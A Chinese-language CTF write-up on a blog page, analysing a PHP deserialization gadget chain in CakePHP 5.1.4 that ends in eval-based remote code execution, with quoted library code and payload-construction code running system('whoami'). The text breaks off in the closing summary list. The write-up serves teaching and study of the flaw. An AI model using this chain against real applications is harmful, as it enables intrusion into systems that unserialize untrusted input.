<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SUCTF | SoulfulVoyager</title><meta name="author" content="Abernethy"><meta name="copyright" content="Abernethy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SUCTF_CakePHP 5.1.4 反序列化攻击链详细分析攻击链概览1234567891011RejectedPromise::__destruct()     ↓Response::__toString()     ↓Table::__call()     ↓BehaviorRegistry::call()     ↓MockClass::generate()     ↓eval() - R">
<meta property="og:type" content="article">
<meta property="og:title" content="SUCTF">
<meta property="og:url" content="https://sebastian-alphax.github.io/2025/09/12/SUCTF/index.html">
<meta property="og:site_name" content="SoulfulVoyager">
<meta property="og:description" content="SUCTF_CakePHP 5.1.4 反序列化攻击链详细分析攻击链概览1234567891011RejectedPromise::__destruct()     ↓Response::__toString()     ↓Table::__call()     ↓BehaviorRegistry::call()     ↓MockClass::generate()     ↓eval() - R">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/263e5fe7c7bc4d83879090fd5082e7a9.png">
<meta property="article:published_time" content="2025-09-11T16:25:28.630Z">
<meta property="article:modified_time" content="2025-09-12T05:09:03.081Z">
<meta property="article:author" content="Abernethy">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/263e5fe7c7bc4d83879090fd5082e7a9.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "SUCTF",
  "url": "https://sebastian-alphax.github.io/2025/09/12/SUCTF/",
  "image": "https://blog-abc.oss-cn-beijing.aliyuncs.com/image/263e5fe7c7bc4d83879090fd5082e7a9.png",
  "datePublished": "2025-09-11T16:25:28.630Z",
  "dateModified": "2025-09-12T05:09:03.081Z",
  "author": [
    {
      "@type": "Person",
      "name": "Abernethy",
      "url": "https://sebastian-alphax.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/icons8.jpg"><link rel="canonical" href="https://sebastian-alphax.github.io/2025/09/12/SUCTF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SUCTF',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-video"></i><span> gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://blog-abc.oss-cn-beijing.aliyuncs.com/image/263e5fe7c7bc4d83879090fd5082e7a9.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">SoulfulVoyager</span></a><a class="nav-page-title" href="/"><span class="site-name">SUCTF</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw fas fa-video"></i><span> gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SUCTF</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-09-11T16:25:28.630Z" title="Created 2025-09-12 00:25:28">2025-09-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-09-12T05:09:03.081Z" title="Updated 2025-09-12 13:09:03">2025-09-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="SUCTF-CakePHP-5-1-4-反序列化攻击链详细分析"><a href="#SUCTF-CakePHP-5-1-4-反序列化攻击链详细分析" class="headerlink" title="SUCTF_CakePHP 5.1.4 反序列化攻击链详细分析"></a>SUCTF_CakePHP 5.1.4 反序列化攻击链详细分析</h1><h2 id="攻击链概览"><a href="#攻击链概览" class="headerlink" title="攻击链概览"></a>攻击链概览</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">RejectedPromise::__destruct() </span><br><span class="line">    ↓</span><br><span class="line">Response::__toString() </span><br><span class="line">    ↓</span><br><span class="line">Table::__call() </span><br><span class="line">    ↓</span><br><span class="line">BehaviorRegistry::call() </span><br><span class="line">    ↓</span><br><span class="line">MockClass::generate() </span><br><span class="line">    ↓</span><br><span class="line">eval() - RCE</span><br></pre></td></tr></table></figure>



<h2 id="详细分析每个环节"><a href="#详细分析每个环节" class="headerlink" title="详细分析每个环节"></a>详细分析每个环节</h2><h3 id="1-入口点-反序列化触发"><a href="#1-入口点-反序列化触发" class="headerlink" title="1. 入口点 - 反序列化触发"></a>1. 入口点 - 反序列化触发</h3><p><strong>位置</strong>: <code>src/PagesController.php:79</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handleSer</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ser</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">getQuery</span>(<span class="string">&#x27;ser&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$ser</span>));  <span class="comment">// 直接反序列化用户输入</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>攻击方式</strong>: <code>GET /ser?ser=&lt;base64_encoded_payload&gt;</code></p>
<p><strong>关键点</strong>:</p>
<ul>
<li><p>没有任何输入验证</p>
</li>
<li><p>直接反序列化用户控制的Base64数据</p>
</li>
<li><p>这是整个攻击链的起点</p>
</li>
</ul>
<h3 id="2-第一环-RejectedPromise-destruct"><a href="#2-第一环-RejectedPromise-destruct" class="headerlink" title="2. 第一环 - RejectedPromise::__destruct()"></a>2. 第一环 - RejectedPromise::__destruct()</h3><p><strong>文件</strong>: <code>src/cakephp-5-1-4/vendor/react/promise/src/Internal/RejectedPromise.php</code></p>
<p><strong>关键代码</strong>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;handled) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$handler</span> = <span class="title function_ invoke__">set_rejection_handler</span>(<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$handler</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Unhandled promise rejection with &#x27;</span> . <span class="variable language_">$this</span>-&gt;reason;</span><br><span class="line">        \<span class="title function_ invoke__">error_log</span>(<span class="variable">$message</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$handler</span>(<span class="variable language_">$this</span>-&gt;reason);  <span class="comment">// 关键：调用handler函数</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (\<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="comment">// 错误处理</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>攻击原理</strong>:</p>
<ol>
<li><p>当RejectedPromise对象被销毁时，<code>__destruct()</code>方法被调用</p>
</li>
<li><p>如果 <code>$this-&gt;handled</code>为false，会尝试获取rejection handler</p>
</li>
</ol>
<ol start="3">
<li><p>如果handler存在，会调用 <code>$handler($this-&gt;reason)</code></p>
</li>
<li><p>这里 <code>$this-&gt;reason</code>是可控的，可以设置为任意对象</p>
</li>
</ol>
<p><strong>构造要点</strong>:</p>
<ul>
<li><p><code>$this-&gt;handled</code> 必须为 <code>false</code></p>
</li>
<li><p><code>$this-&gt;reason</code> 设置为我们想要触发的对象</p>
</li>
<li><p>需要确保 <code>set_rejection_handler(null)</code>返回非null值</p>
</li>
</ul>
<h3 id="3-第二环-Response-toString"><a href="#3-第二环-Response-toString" class="headerlink" title="3. 第二环 - Response::__toString()"></a>3. 第二环 - Response::__toString()</h3><p><strong>文件</strong>: <code>src/cakephp-5-1-4/vendor/cakephp/cakephp/src/Http/Response.php</code></p>
<p><strong>关键代码</strong>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;stream-&gt;<span class="title function_ invoke__">rewind</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;stream-&gt;<span class="title function_ invoke__">getContents</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>攻击原理</strong>:</p>
<ol>
<li><p>当Response对象被转换为字符串时，<code>__toString()</code>方法被调用</p>
</li>
<li><p>调用 <code>$this-&gt;stream-&gt;rewind()</code>方法</p>
</li>
</ol>
<ol start="3">
<li><p>调用 <code>$this-&gt;stream-&gt;getContents()</code>方法</p>
</li>
<li><p>如果 <code>$this-&gt;stream</code>是可控的对象，可以触发其方法</p>
</li>
</ol>
<p><strong>构造要点</strong>:</p>
<ul>
<li><p>将Response对象设置为RejectedPromise的reason</p>
</li>
<li><p>设置 <code>$this-&gt;stream</code>为可控对象</p>
</li>
<li><p>确保该对象有 <code>rewind()</code>和 <code>getContents()</code>方法</p>
</li>
</ul>
<h3 id="4-第三环-Table-call"><a href="#4-第三环-Table-call" class="headerlink" title="4. 第三环 - Table::__call()"></a>4. 第三环 - Table::__call()</h3><p><strong>文件</strong>: <code>src/cakephp-5-1-4/vendor/cakephp/cakephp/src/ORM/Table.php</code></p>
<p><strong>关键代码</strong>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$method</span>, <span class="keyword">array</span> <span class="variable">$args</span></span>): <span class="title">mixed</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;_behaviors-&gt;<span class="title function_ invoke__">hasMethod</span>(<span class="variable">$method</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_behaviors-&gt;<span class="title function_ invoke__">call</span>(<span class="variable">$method</span>, <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^find(?:\w+)?By/&#x27;</span>, <span class="variable">$method</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_dynamicFinder</span>(<span class="variable">$method</span>, <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">BadMethodCallException</span>(</span><br><span class="line">        <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;Unknown method `%s` called on `%s`&#x27;</span>, <span class="variable">$method</span>, <span class="built_in">static</span>::<span class="variable language_">class</span>),</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>攻击原理</strong>:</p>
<ol>
<li><p>当调用Table对象上不存在的方法时，<code>__call()</code>方法被触发</p>
</li>
<li><p>首先检查 <code>$this-&gt;_behaviors-&gt;hasMethod($method)</code></p>
</li>
</ol>
<ol start="3">
<li><p>如果返回true，调用 <code>$this-&gt;_behaviors-&gt;call($method, $args)</code></p>
</li>
<li><p>这里 <code>$method</code>和 <code>$args</code>都是可控的</p>
</li>
</ol>
<p><strong>构造要点</strong>:</p>
<ul>
<li><p>将Table对象设置为Response的stream</p>
</li>
<li><p>设置 <code>$this-&gt;_behaviors</code>为可控对象</p>
</li>
<li><p>确保该对象的 <code>hasMethod()</code>方法返回true</p>
</li>
<li><p>确保该对象的 <code>call()</code>方法可以被利用</p>
</li>
</ul>
<h3 id="5-第四环-BehaviorRegistry-call"><a href="#5-第四环-BehaviorRegistry-call" class="headerlink" title="5. 第四环 - BehaviorRegistry::call()"></a>5. 第四环 - BehaviorRegistry::call()</h3><p><strong>文件</strong>: <code>src/cakephp-5-1-4/vendor/cakephp/cakephp/src/ORM/BehaviorRegistry.php</code></p>
<p><strong>关键代码</strong>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$method</span>, <span class="keyword">array</span> <span class="variable">$args</span> = []</span>): <span class="title">mixed</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$method</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">hasMethod</span>(<span class="variable">$method</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$this</span>-&gt;_methodMap[<span class="variable">$method</span>][<span class="number">0</span>])) &#123;</span><br><span class="line">        [<span class="variable">$behavior</span>, <span class="variable">$callMethod</span>] = <span class="variable language_">$this</span>-&gt;_methodMap[<span class="variable">$method</span>];</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_loaded[<span class="variable">$behavior</span>]-&gt;&#123;<span class="variable">$callMethod</span>&#125;(...<span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">BadMethodCallException</span>(</span><br><span class="line">        <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;Cannot call `%s`, it does not belong to any attached behavior.&#x27;</span>, <span class="variable">$method</span>),</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>攻击原理</strong>:</p>
<ol>
<li><p>将method转换为小写</p>
</li>
<li><p>检查 <code>$this-&gt;hasMethod($method)</code>和 <code>$this-&gt;has($this-&gt;_methodMap[$method][0])</code></p>
</li>
</ol>
<ol start="3">
<li><p>从 <code>$this-&gt;_methodMap[$method]</code>获取 <code>[$behavior, $callMethod]</code></p>
</li>
<li><p>调用 <code>$this-&gt;_loaded[$behavior]-&gt;&#123;$callMethod&#125;(...$args)</code></p>
</li>
</ol>
<ol start="5">
<li>这里 <code>$behavior</code>、<code>$callMethod</code>和 <code>$args</code>都是可控的</li>
</ol>
<p><strong>构造要点</strong>:</p>
<ul>
<li><p>设置 <code>$this-&gt;_methodMap</code>数组，键为method名，值为 <code>[behavior_name, call_method]</code></p>
</li>
<li><p>设置 <code>$this-&gt;_loaded</code>数组，键为behavior_name，值为目标对象</p>
</li>
<li><p>确保目标对象有对应的call_method方法</p>
</li>
</ul>
<h3 id="6-第五环-MockClass-generate-RCE"><a href="#6-第五环-MockClass-generate-RCE" class="headerlink" title="6. 第五环 - MockClass::generate() - RCE"></a>6. 第五环 - MockClass::generate() - RCE</h3><p><strong>文件</strong>: <code>src/cakephp-5-1-4/vendor/phpunit/phpunit/src/Framework/MockObject/Generator/MockClass.php</code></p>
<p><strong>关键代码</strong>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generate</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">class_exists</span>(<span class="variable">$this</span>-&gt;mockName, <span class="literal">false</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;classCode);  <span class="comment">// 关键：直接执行PHP代码</span></span><br><span class="line">      </span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(</span><br><span class="line">            [</span><br><span class="line">                <span class="variable">$this</span>-&gt;mockName,</span><br><span class="line">                <span class="string">&#x27;__phpunit_initConfigurableMethods&#x27;</span>,</span><br><span class="line">            ],</span><br><span class="line">            ...<span class="variable">$this</span>-&gt;configurableMethods,</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;mockName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>攻击原理</strong>:</p>
<ol>
<li><p>检查 <code>$this-&gt;mockName</code>类是否存在</p>
</li>
<li><p>如果不存在，直接执行 <code>eval($this-&gt;classCode)</code></p>
</li>
</ol>
<ol start="3">
<li><p>这里 <code>$this-&gt;classCode</code>是完全可控的PHP代码</p>
</li>
<li><p>可以执行任意PHP代码，实现RCE</p>
</li>
</ol>
<p><strong>构造要点</strong>:</p>
<ul>
<li><p>设置 <code>$this-&gt;mockName</code>为一个不存在的类名</p>
</li>
<li><p>设置 <code>$this-&gt;classCode</code>为恶意PHP代码</p>
</li>
<li><p>确保 <code>$this-&gt;configurableMethods</code>不会导致错误</p>
</li>
</ul>
<h2 id="完整攻击载荷构造"><a href="#完整攻击载荷构造" class="headerlink" title="完整攻击载荷构造"></a>完整攻击载荷构造</h2><h3 id="1-构造MockClass对象"><a href="#1-构造MockClass对象" class="headerlink" title="1. 构造MockClass对象"></a>1. 构造MockClass对象</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mockClass</span> = <span class="keyword">new</span> <span class="title class_">\PHPUnit\Framework\MockObject\Generator\MockClass</span>(</span><br><span class="line">    <span class="string">&#x27;&lt;?php system(&quot;whoami&quot;); ?&gt;&#x27;</span>,  <span class="comment">// classCode - 恶意PHP代码</span></span><br><span class="line">    <span class="string">&#x27;NonExistentClass&#x27;</span>,            <span class="comment">// mockName - 不存在的类名</span></span><br><span class="line">    []                             <span class="comment">// configurableMethods - 空数组</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>



<h3 id="2-构造BehaviorRegistry对象"><a href="#2-构造BehaviorRegistry对象" class="headerlink" title="2. 构造BehaviorRegistry对象"></a>2. 构造BehaviorRegistry对象</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$behaviorRegistry</span> = <span class="keyword">new</span> <span class="title class_">\Cake</span>\ORM\<span class="title function_ invoke__">BehaviorRegistry</span>();</span><br><span class="line"><span class="variable">$behaviorRegistry</span>-&gt;_methodMap = [<span class="string">&#x27;test&#x27;</span> =&gt; [<span class="string">&#x27;mock&#x27;</span>, <span class="string">&#x27;generate&#x27;</span>]];</span><br><span class="line"><span class="variable">$behaviorRegistry</span>-&gt;_loaded = [<span class="string">&#x27;mock&#x27;</span> =&gt; <span class="variable">$mockClass</span>];</span><br></pre></td></tr></table></figure>



<h3 id="3-构造Table对象"><a href="#3-构造Table对象" class="headerlink" title="3. 构造Table对象"></a>3. 构造Table对象</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$table</span> = <span class="keyword">new</span> <span class="title class_">\Cake</span>\ORM\<span class="title function_ invoke__">Table</span>();</span><br><span class="line"><span class="variable">$table</span>-&gt;_behaviors = <span class="variable">$behaviorRegistry</span>;</span><br></pre></td></tr></table></figure>



<h3 id="4-构造Response对象"><a href="#4-构造Response对象" class="headerlink" title="4. 构造Response对象"></a>4. 构造Response对象</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$response</span> = <span class="keyword">new</span> <span class="title class_">\Cake\Http\Response</span>();</span><br><span class="line"><span class="variable">$response</span>-&gt;stream = <span class="variable">$table</span>;</span><br></pre></td></tr></table></figure>



<h3 id="5-构造RejectedPromise对象"><a href="#5-构造RejectedPromise对象" class="headerlink" title="5. 构造RejectedPromise对象"></a>5. 构造RejectedPromise对象</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rejectedPromise</span> = <span class="keyword">new</span> <span class="title class_">\React\Promise\Internal\RejectedPromise</span>(<span class="variable">$response</span>);</span><br></pre></td></tr></table></figure>



<h3 id="6-序列化并编码"><a href="#6-序列化并编码" class="headerlink" title="6. 序列化并编码"></a>6. 序列化并编码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$rejectedPromise</span>);</span><br><span class="line"><span class="variable">$encoded</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$serialized</span>);</span><br></pre></td></tr></table></figure>



<h2 id="攻击流程总结"><a href="#攻击流程总结" class="headerlink" title="攻击流程总结"></a>攻击流程总结</h2><ol>
<li><p><strong>反序列化触发</strong>: 用户访问 <code>/ser?ser=&lt;payload&gt;</code>，触发 <code>unserialize()</code></p>
</li>
